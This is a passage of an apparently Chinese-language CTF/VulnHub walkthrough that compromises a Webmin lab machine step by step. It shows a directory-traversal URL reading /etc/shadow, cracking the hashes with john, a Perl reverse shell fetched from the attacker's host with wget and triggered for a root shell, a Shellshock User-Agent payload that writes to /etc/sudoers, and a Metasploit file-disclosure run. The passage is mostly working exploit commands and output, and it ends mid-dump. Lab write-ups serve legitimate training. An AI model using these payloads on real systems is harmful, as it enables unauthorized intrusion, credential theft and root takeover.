klog:x:102:103::/home/klog:/bin/false mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash obama:x:1001:1001::/home/obama:/bin/bash osama:x:1002:1002::/home/osama:/bin/bash yomama:x:1003:1003::/home/yomama:/bin/bash </span><br></pre></td></tr></table></figure>
+
+<h3 id="转向10000端口的webmin"><a href="#转向10000端口的webmin" class="headerlink" title="转向10000端口的webmin"></a>转向10000端口的webmin</h3><p>本来可以使用<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMjAxNw==">webminperl脚本<i class="fa fa-external-link-alt"></i></span>，但是现在尝试下手工构造poc。。。<br>注意使..%01&#x2F;..%01&#x2F;..%01&#x2F;..%01&#x2F;..%01&#x2F;..%01&#x2F;尽量长一些。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub120.jpg"></p>
+<p>成功读取&#x2F;etc&#x2F;shadow文件，尝试解密root账号的hash值，但是密码太复杂，解不出来。。。只能使用下面的方法然后老老实实提权。</p>
+<h3 id="john破解hash值"><a href="#john破解hash值" class="headerlink" title="john破解hash值"></a>john破解hash值</h3><p>将下面的hash串保存成shadow.txt，然后使用john破解。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root:$1$LKrO9Q3N<span class="variable">$EBgJhPZFHiKXtK0QRqeSm</span>/</span><br><span class="line">vmware:$1<span class="variable">$7nwi9F</span>/D<span class="variable">$AkdCcO2UfsCOM0IC8BYBb</span>/</span><br><span class="line">obama:$1$hvDHcCfx<span class="variable">$pj78hUduionhij9q9JrtA0</span></span><br><span class="line">osama:$1$Kqiv9qBp<span class="variable">$eJg2uGCrOHoXGq0h5ehwe</span>.</span><br><span class="line">yomama:$1<span class="variable">$tI4FJ</span>.kP<span class="variable">$wgDmweY9SAzJZYqW76oDA</span>.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">h4ckm3           (vmware)</span><br><span class="line">1g 0:00:03:57 DONE (2019-12-31 03:46) 0.004212g/s 59396p/s 269590c/s 269590C/s !!!0mc3t..*7¡Vamos!</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@kali:~<span class="comment"># john --show shadow.txt </span></span><br><span class="line">vmware:h4ckm3</span><br><span class="line"></span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 4 left</span><br></pre></td></tr></table></figure>
+<p>得到用户名和密码：vmware&#x2F;h4ckm3</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh vmware@192.168.33.3</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.33.3 (192.168.33.3)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:+C7UA7dQ1B/8zVWHRBD7KeNNfjuSBrtQBMZGd6qoR9w.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.33.3<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">vmware@192.168.33.3&#x27;</span>s password: </span><br><span class="line">Linux ubuntuvm 2.6.22-14-server <span class="comment">#1 SMP Sun Oct 14 23:34:23 GMT 2007 i686</span></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line">Last login: Fri Jun 20 14:35:37 2008</span><br><span class="line">vmware@ubuntuvm:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(vmware) gid=1000(vmware) <span class="built_in">groups</span>=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)</span><br><span class="line">vmware@ubuntuvm:~$ <span class="built_in">whoami</span></span><br><span class="line">vmware</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>phpmyadmin里面的config.inc.php文件没有发现任何有价值的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;host&#x27;</span>]          = <span class="string">&#x27;localhost&#x27;</span>; // MySQL hostname or IP address</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;port&#x27;</span>]          = <span class="string">&#x27;&#x27;</span>;          // MySQL port - leave blank <span class="keyword">for</span> default port</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;socket&#x27;</span>]        = <span class="string">&#x27;&#x27;</span>;          // Path to the socket - leave blank <span class="keyword">for</span> default socket</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;connect_type&#x27;</span>]  = <span class="string">&#x27;tcp&#x27;</span>;       // How to connect to MySQL server (<span class="string">&#x27;tcp&#x27;</span> or <span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;extension&#x27;</span>]     = <span class="string">&#x27;mysql&#x27;</span>;     // The php MySQL extension to use (<span class="string">&#x27;mysql&#x27;</span> or <span class="string">&#x27;mysqli&#x27;</span>)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;compress&#x27;</span>]      = FALSE;       // Use compressed protocol <span class="keyword">for</span> the MySQL connection</span><br><span class="line">                                                    // (requires PHP &gt;= 4.3.0)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;controluser&#x27;</span>]   = <span class="string">&#x27;&#x27;</span>;          // MySQL control user settings</span><br><span class="line">                                                    // (this user must have read-only</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;controlpass&#x27;</span>]   = <span class="string">&#x27;&#x27;</span>;          // access to the <span class="string">&quot;mysql/user&quot;</span></span><br><span class="line">                                                    // and <span class="string">&quot;mysql/db&quot;</span> tables).</span><br><span class="line">                                                    // The controluser is also</span><br><span class="line">                                                    // used <span class="keyword">for</span> all relational</span><br><span class="line">                                                    // features (pmadb)</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;auth_type&#x27;</span>]     = <span class="string">&#x27;http&#x27;</span>;    // Authentication method (config, http or cookie based)?</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;user&#x27;</span>]          = <span class="string">&#x27;root&#x27;</span>;      // MySQL user</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;password&#x27;</span>]      = <span class="string">&#x27;&#x27;</span>;          // MySQL password (only needed</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vmware@ubuntuvm:/var$ <span class="built_in">ls</span> -lah</span><br><span class="line">total 52K</span><br><span class="line">drwxr-xr-x 15 root root  4.0K 2008-06-10 13:28 .</span><br><span class="line">drwxr-xr-x 21 root root  4.0K 2008-06-10 06:37 ..</span><br><span class="line">drwxr-xr-x  2 root root  4.0K 2008-06-10 06:28 backups</span><br><span class="line">drwxr-xr-x  9 root root  4.0K 2008-06-10 07:07 cache</span><br><span class="line">drwxr-xr-x 23 root root  4.0K 2008-06-10 07:08 lib</span><br><span class="line">drwxrwsr-x  2 root staff 4.0K 2007-10-08 05:47 <span class="built_in">local</span></span><br><span class="line">drwxrwxrwt  3 root root    60 2019-12-31 00:24 lock</span><br><span class="line">drwxr-xr-x 11 root root  4.0K 2019-12-31 00:24 <span class="built_in">log</span></span><br><span class="line">drwxrwsr-x  2 root mail  4.0K 2008-06-10 06:24 mail</span><br><span class="line">drwxr-xr-x  2 root root  4.0K 2008-06-10 06:24 opt</span><br><span class="line">drwxr-xr-x 11 root root   400 2019-12-31 02:58 run</span><br><span class="line">drwxr-xr-x  5 root root  4.0K 2008-06-10 07:07 spool</span><br><span class="line">drwxrwxrwt  2 root root  4.0K 2007-10-08 05:47 tmp</span><br><span class="line">drwx------  2 root bin   4.0K 2008-06-10 13:31 webmin</span><br><span class="line">drwxr-xr-x  3 root root  4.0K 2008-06-12 09:55 www</span><br></pre></td></tr></table></figure>
+
+<p>知道Webmin以root身份运行，只需要找到一个可以写的位置并使用文件包含来调用该文件。 回顾Webmin上的源代码，注意到它正在使用.CGI。 经过研究，发现<span class="exturl" data-url="aHR0cHM6Ly91c2Vycy5jcy5jZi5hYy51ay9EYXZlLk1hcnNoYWxsL1BFUkwvbm9kZTE4OC5odG1sI1NFQ1RJT04wMDIwMTIwMDAwMDAwMDAwMDAwMDA=">.CGI<i class="fa fa-external-link-alt"></i></span>使用[perl]（perl，C＃或unix脚本。因此，到&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;perl目录，复制了perl reverse shell，将ip和端口更改为443， 以及从pl到.cgi的扩展名。使用wget将其发送到Web服务器。</p>
+<p>先leafpad将perl-reverse-shell.pl的ip改成kali的ip,端口改成443</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/webshells/perl<span class="comment"># cp perl-reverse-shell.pl mine.cgi</span></span><br><span class="line">root@kali:/usr/share/webshells/perl<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>
+
+<p>shell中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vmware@ubuntuvm:~$ wget http://192.168.33.1:8000/mine.cgi</span><br><span class="line">--03:44:12--  http://192.168.33.1:8000/mine.cgi</span><br><span class="line">           =&gt; `mine.cgi<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.33.1:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 3,714 (3.6K) [application/octet-stream]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[===========================================================&gt;] 3,714         --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">03:44:12 (852.45 MB/s) - `mine.cgi&#x27;</span> saved [3714/3714]</span><br><span class="line"></span><br><span class="line">vmware@ubuntuvm:~$ <span class="built_in">chmod</span> 777 *</span><br><span class="line">vmware@ubuntuvm:~$ <span class="built_in">ls</span></span><br><span class="line">mine.cgi</span><br></pre></td></tr></table></figure>
+
+<p>浏览器中执行poc,稍等片刻即可返回root的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/mine.cgi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.33.3: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.33.1] from (UNKNOWN) [192.168.33.3] 37512</span><br><span class="line"> 03:49:32 up  3:24,  1 user,  load average: 0.01, 0.09, 0.06</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">vmware   pts/0    192.168.33.1     03:47   13.00s  0.03s  0.03s -bash</span><br><span class="line">Linux ubuntuvm 2.6.22-14-server <span class="comment">#1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">/</span><br><span class="line">/usr/sbin/apache: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># cd /root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">keys</span></span><br><span class="line"><span class="string"># cat keys</span></span><br><span class="line"><span class="string">cat: keys: Is a directory</span></span><br><span class="line"><span class="string"># cd keys</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string"># ls -la</span></span><br><span class="line"><span class="string">total 8</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Jun 12  2008 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 4 root root 4096 Jun 12  2008 ..</span></span><br><span class="line"><span class="string"># cd ..</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">keys</span></span><br></pre></td></tr></table></figure>
+
+<p>到此为止，提权完成。</p>
+<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>查看是否存在shellshock漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vmware@ubuntuvm:~$ <span class="built_in">env</span> X=<span class="string">&#x27;() &#123; :; &#125;; echo &quot;CVE-2014-6271 vulnerable&quot;&#x27;</span> bash -c <span class="built_in">date</span></span><br><span class="line">CVE-2014-6271 vulnerable</span><br><span class="line">Tue Dec 31 06:59:03 CST 2019</span><br></pre></td></tr></table></figure>
+
+<p>创建bash脚本并命名为hello.cgi，并放到目标shell中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Content-type: text/HMTL\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;HTML&gt;\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;HEllo World!&lt;/title&gt;&lt;/head&gt;\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;BODY&gt;\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;h2&gt;Hello World!&lt;/h2&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vmware@ubuntuvm:/tmp$ wget http://192.168.33.1:8000/hello.cgi</span><br><span class="line">--08:40:16--  http://192.168.33.1:8000/hello.cgi</span><br><span class="line">           =&gt; `hello.cgi<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.33.1:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 169 [application/octet-stream]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[==============================================================&gt;] 169           --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">08:40:16 (70.88 MB/s) - `hello.cgi&#x27;</span> saved [169/169]</span><br></pre></td></tr></table></figure>
+
+<p>构造下面的poc浏览器访问,并burp抓包，如下将请求包改包,然后发包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.33.3:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.33.3:10000</span><br><span class="line">User-Agent: () &#123; :; &#125;;/bin/echo <span class="string">&quot;vmware ALL=(ALL) ALL&quot;</span>&gt;&gt;/etc/sudoers</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: testing=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>关键是删去原有的User-Agent的内容，然后加上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;;/bin/echo <span class="string">&quot;vmware ALL=(ALL) ALL&quot;</span>&gt;&gt;/etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p>即可将vmware用户添加到超级用户组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vmware@ubuntuvm:/tmp$ sudo su</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>再次成功提权。</p>
+<h3 id="other-way-to-get-shell-and-privilege-escalate-by-using-msf"><a href="#other-way-to-get-shell-and-privilege-escalate-by-using-msf" class="headerlink" title="other way to get shell and privilege escalate by using msf"></a>other way to get shell and privilege escalate by using msf</h3><p>Webmin和Usermin中已经报告了一个漏洞，恶意人员可以利用此漏洞来披露潜在的敏感信息。 该漏洞是由于URL处理中的未指定错误引起的。 可以利用此漏洞通过特制的URL读取服务器上任何文件的内容，而无需有效的登录。 已在Webmin（1.290之前的版本）和Usermin（1.220之前的版本）中报告了此漏洞。</p>
+<p>使用msf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">         .                                         .                                                      </span><br><span class="line"> .                                                                                                        </span><br><span class="line">                                                                                                          </span><br><span class="line">      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o                                         </span><br><span class="line">       <span class="string">&#x27;   dB&#x27;</span>                     BBP                                                                    </span><br><span class="line">    dB<span class="string">&#x27;dB&#x27;</span>dB<span class="string">&#x27; dBBP     dBP     dBP BB                                                                     </span></span><br><span class="line"><span class="string">   dB&#x27;</span>dB<span class="string">&#x27;dB&#x27;</span> dBP      dBP     dBP  BB                                                                     </span><br><span class="line">  dB<span class="string">&#x27;dB&#x27;</span>dB<span class="string">&#x27; dBBBBP   dBP     dBBBBBBB                                                                     </span></span><br><span class="line"><span class="string">                                                                                                          </span></span><br><span class="line"><span class="string">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP                           </span></span><br><span class="line"><span class="string">          .                  .                  dB&#x27;</span> dBP    dB<span class="string">&#x27;.BP                                         </span></span><br><span class="line"><span class="string">                             |       dBP    dBBBB&#x27;</span> dBP    dB<span class="string">&#x27;.BP dBP    dBP                               </span></span><br><span class="line"><span class="string">                           --o--    dBP    dBP    dBP    dB&#x27;</span>.BP dBP    dBP                                </span><br><span class="line">                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                                 </span><br><span class="line">                                                                                                          </span><br><span class="line">                                                                    .                                     </span><br><span class="line">                .                                                                                         </span><br><span class="line">        o                  To boldly go <span class="built_in">where</span> no                                                          </span><br><span class="line">                            shell has gone before                                                         </span><br><span class="line">                                                                                                          </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.66-dev                          ]</span><br><span class="line">+ -- --=[ 1956 exploits - 1089 auxiliary - 336 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/admin/webmin/file_disclosure</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> DIR /unauthenticated</span><br><span class="line">DIR =&gt; /unauthenticated</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RPATH /etc/shadow</span><br><span class="line">RPATH =&gt; /etc/shadow</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RPORT 10000</span><br><span class="line">RPORT =&gt; 10000</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RHOST 192.168.33.3</span><br><span class="line">RHOST =&gt; 192.168.33.3</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; run</span><br><span class="line">[*] Running module against 192.168.33.3</span><br><span class="line"></span><br><span class="line">[*] Attempting to retrieve /etc/shadow...</span><br><span class="line">[*] The server returned: 200 Document follows</span><br><span class="line">root:$1$LKrO9Q3N<span class="variable">$EBgJhPZFHiKXtK0QRqeSm</span>/:14041:0:99999:7:::</span><br><span class="line">daemon:*:14040:0:99999:7:::</span><br><span class="line">bin:*:14040:0:99999:7:::</span><br><span class="line">sys:*:14040:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:14040:0:99999:7:::</span><br><span class="line">games:*:14040:0:99999:7:::</span><br><span class="line">man:*:14040:0:99999:7:::</span><br><span class="line">lp:*:14040:0:99999:7:::</span><br><span class="line">mail:*:14040:0:99999:7:::</span><br><span class="line">news:*:14040:0:99999:7:::</span><br><span class="line">uucp:*:14040:0:99999:7:::</span><br><span class="line">proxy:*:14040:0:99999:7:::</span><br><span class="line">www-data:*:14040:0:99999:7:::</span><br><span class="line">backup:*:14040:0:99999:7:::</span><br><span class="line">list:*:14040:0:99999:7:::</span><br><span class="line">irc:*:14040:0:99999:7:::</span><br><span class="line">gnats:*:14040:0:99999:7:::</span><br><span class="line">nobody:*:14040:0:99999:7:::</span><br><span class="line">dhcp:!:14040:0:99999:7:::</span><br><span class="line">syslog:!:14040:0:99999:7:::</span><br><span class="line">klog:!:14040:0:99999:7:::</span><br><span class="line">mysql:!:14040:0:99999:7:::</span><br><span class="line">sshd:!:14040:0:99999:7:::</span><br><span class="line">vmware:$1<span class="variable">$7nwi9F</span>/D<span 